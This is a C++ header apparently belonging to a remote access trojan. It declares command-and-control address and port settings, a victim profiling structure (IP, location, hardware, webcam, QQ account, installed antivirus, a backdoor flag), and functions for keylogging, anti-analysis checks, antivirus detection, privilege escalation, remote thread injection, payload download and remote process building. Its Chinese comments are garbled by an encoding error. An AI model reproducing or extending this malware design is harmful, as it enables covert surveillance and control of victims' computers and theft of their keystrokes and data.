#pragma once
#include "LoginManager.h"
#include <TLHELP32.H>
#include <comdef.h>
#include <string>
#include <wininet.h>
#include<Shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#include <LM.h>
#pragma comment(lib, "netapi32.lib")
#include "md5.h"
/*************�ж���Ƶ��ͷ�ļ�*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")

#include <DXGI.h>
#pragma comment(lib,"DXGI.lib")

#include <Psapi.h>
#pragma comment (lib,"Psapi.lib")

#include "Input.h" //���̼�¼



using namespace std;


struct Function    
{
	BOOL IsKeyboard;		//�������߼�¼
	BOOL bool0;
	BOOL ProtectedProcess;	//���̱���
	BOOL antinet;			//��������
	BOOL RunDllEntryProc;	//�Ƿ�����DLL���
	
	BOOL  Processdaemon;	//�����ػ�
	BOOL  puppet;			//���ܽ���
	BOOL  special;			//�ر�
	BOOL  bool4;	//����
	BOOL  bool5;	//����


	TCHAR other1[255];  //����
	TCHAR other2[255];  //����
	TCHAR other3[255];  //����
	TCHAR other4[255];	//����
	TCHAR other5[255];  //����
};

extern struct Info
{
	char mark[30];		//���
	TCHAR szAddress[255];  //ip
	TCHAR szPort[30];		//�˿�
	BOOL IsTcp;			//ͨ��ģʽ
	TCHAR szAddress2[255];  //ip
	TCHAR szPort2[30];		//�˿�
	BOOL IsTcp2;			//ͨ��ģʽ
	TCHAR szAddress3[255];  //ip
	TCHAR szPort3[30];		//�˿�
	BOOL IsTcp3;			//ͨ��ģʽ
	TCHAR szRunSleep[30];	//���еȴ�����ʼ����ʱ�ȴ�ʱ�� ��ֹ�ֶ��鿴������أ�
	TCHAR szHeart[30];		//����ʱ��
	TCHAR szGroup[50];		//����
	TCHAR szVersion[50];	//�汾
	TCHAR Remark[50];		//��ע
	Function otherset;		//��������
}MyInfo;


struct plugInfo
{
	char mark[30];		//���
	TCHAR szAddress[255];  //ip
	DWORD szPort;	//�˿�
	BOOL IsTcp;
	BOOL RunDllEntryProc;
};


typedef struct
{
	BYTE			Btoken;			//Э��
	TCHAR			N_ip[255];		//����IP
	TCHAR			ip[20];			//����IP
	TCHAR			addr[40];		//λ��
	TCHAR			UserActive[15];	//��Ծ״̬
	TCHAR			CptName[50];	//�������
	TCHAR			OsName[50];		//ϵͳ��
	TCHAR			OSVersion[30];	//ϵͳ
	TCHAR			CPU[60];		//CPU
	TCHAR			DAM[200];		//Ӳ��+�ڴ�
	TCHAR			GPU[150];		//�Կ�
	TCHAR			Window[255];	//��ǰ����
	TCHAR			Group[50];		//����
	TCHAR			Version[50];	//�汾
	TCHAR			Remark[50];		//��ע
	TCHAR			m_Time[50];		//����ʱ��
	TCHAR			ExeAndOs[10];	//�����ϵͳ�Ƿ�Ϊ64λ
	TCHAR			Process[50];	//����Ȩ���û�
	TCHAR			ProcPath[250];	//����·��
	TCHAR			pid[10];		//����ID
	TCHAR			IsWebCam[4];	//����ͷ
	TCHAR			Chat[255];		//����
	TCHAR			Virus[50];		//ɱ��
	TCHAR			lpLCData[32];	//ϵͳ����
	TCHAR			Monitors[255];	//��ʾ����Ϣ
	TCHAR			szSysdire[50];	//ϵͳĿ¼
	TCHAR			szHWID[49];		//HWID
	BOOL			backdoor;		//���ű�־
}LOGININFO;

//Զ���̲߳����ṹ��
typedef struct _remoteTdParams
{
	LPVOID ZWinExec;             // WinExec Function Address
	LPVOID ZOpenProcess;         // OpenProcess Function Address
	LPVOID ZExitProcess;
	LPVOID ZWaitForSingleObject; // WaitForSingleObject Function Address
	DWORD ZPid;                  // Param => Process id
	HANDLE ZProcessHandle;       // Param => Handle
	CHAR filePath[255];   // Param => File Path
}RemoteParam;


int sendLoginInfo(ISocketBase* pClient, TCHAR* Time, BOOL sw_user);

VOID BufToMd5(TCHAR* a, TCHAR* b, TCHAR* c = NULL, TCHAR* d = NULL, TCHAR* e = NULL, TCHAR* f = NULL, TCHAR* g = NULL, TCHAR* h=NULL);

void getactivewindows(TCHAR* str); //��ȡǰ������



BOOL AntiCheck();

unsigned int __stdcall AntiCheckThread(LPVOID lparam);
/////////////////ɱ����ʾ//////////////////////////////////
typedef struct
{
	TCHAR* Course;
	TCHAR* Name;
}AYSDFE;

typedef BOOL(WINAPI* TRegQueryValueEx)(HKEY, LPCTSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef int (WINAPI* TRegOpenKeyEx)(HKEY, LPCTSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI* TRegSetValueEx)(HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, CONST BYTE* lpData, DWORD cbData);
typedef BOOL(WINAPI* TRegEnumValue)(HKEY, DWORD, LPTSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef BOOL(WINAPI* TRegEnumKeyEx)(HKEY, DWORD, LPTSTR, LPDWORD, LPDWORD, LPTSTR, LPDWORD, PFILETIME);
typedef BOOL(WINAPI* TRegCloseKey)(HKEY);

typedef BOOL(WINAPI* TSHGetSpecialFolderPath)(HWND hwndOwner, LPTSTR lpszPath, int nFolder, BOOL fCreate);

BOOL GetOpenKeyLoggerReg();

unsigned int __stdcall KeyLogger(LPVOID lparam);

void GetTimeFormat(TCHAR* t_time);

DWORD GetProcessID(LPCWSTR lpProcessName);

TCHAR* GetVirus();

void GetActive(TCHAR* UserActive); // �û�״̬

BOOL GetQQ(TCHAR* m_qq);

UINT EnumDevices(); //ö����Ƶ�豸

bool IsWebCam();

BOOL GetProcessUserName(TCHAR* strProcessUser);

BOOL GetLogonFromToken(HANDLE hToken, _bstr_t& strUser, _bstr_t& strdomain);

HRESULT GetUserFromProcess(TCHAR* temp);

BOOL GetProcessIntegrity(LOGININFO* temp);//�ȼ�

void GetDiskAndMem(TCHAR* pBuf); // �ڴ�

int  ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, TCHAR* szData, LPBYTE szBytes, DWORD lbSize, int Mode); //��ȡע����ָ����������

void getgpuandMonitor(TCHAR* p_buf, TCHAR* p_Monitorbuf); //��ȡGPU��Ϣ ��ʾ��

BOOL IsWindowsX64(); //�жϲ���ϵͳ�Ƿ�Ϊ64λ

void GetNtVersionNumbers(TCHAR* OSVersion, TCHAR* CptName);//��ȡϵͳ�汾��

LONG WINAPI My_bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);

char* TCHAR2char(const TCHAR* STR);

TCHAR* char2TCAHR(const char* str);

BOOL CallNtSetinformationProcess();

unsigned int __stdcall loactThreadProc(_In_ LPVOID lpParameter);

BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);

int memfind(const char* mem, const char* str, int sizem, int sizes);

bool http_get(LPCTSTR szURL, LPCTSTR szFileName);

bool buildremoteprocess(byte* data, int size);

void Getfindinfo(TCHAR* s, const TCHAR* f1, TCHAR* outstring, BOOL* user);

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);

BOOL GetProcessFullPath(DWORD dwPID, TCHAR* fullPath);
